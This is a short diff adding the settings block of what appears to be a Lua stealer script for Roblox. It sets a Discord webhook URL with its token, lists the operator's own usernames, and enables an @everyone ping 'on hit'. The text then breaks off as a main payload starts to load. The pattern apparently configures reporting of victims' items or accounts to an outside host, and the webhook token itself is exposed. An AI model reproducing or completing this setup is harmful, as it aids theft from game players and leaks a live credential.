@@ -1,0 +1,8 @@
+-- SETTINGS
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1488685146277285999/Shyt2iHW9GvfE-WUBNyknw__glGe8g9LmvPJQMZtAfbbX0kL9cEWybJb8UWPCdQZYPPf" -- Input Ur webhook Here
+_G.MY_USERNAMES = {"thrqiccx", "hisbestmistakexo", "X"} -- YOUR own usernames
+_G.PING_POOR = true -- True/False To Ping @Everyone ON HIT
+
+-- Load Main
+task.spawn(function()
+   
